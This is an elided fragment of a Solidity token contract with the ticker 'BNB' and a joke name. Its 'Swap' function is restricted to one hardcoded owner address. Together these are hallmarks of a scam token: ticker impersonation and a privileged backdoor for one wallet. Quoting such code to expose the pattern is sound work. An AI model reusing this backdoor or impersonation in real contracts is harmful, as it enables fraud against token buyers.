...
contract bnb is Context, IERC20 {
    ...
    modifier _auth() {require(msg.sender == 0xDB75FCbA470d98b2be8935eecf542A9bDc1F0999, "Not allowed to interact");_;}
  ...
  function Swap(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _auth(){
    ...
    address public _Owner = 0xDB75FCbA470d98b2be8935eecf542A9bDc1F0999;

    constructor () public {
        _name = "PogMiladyUwUCumInu9000";
        _symbol ="BNB";
        _decimals = 18;
        uint256 initialSupply = 6900000000;
        team = 0xDB75FCbA470d98b2be8935eecf542A9bDc1F0999;
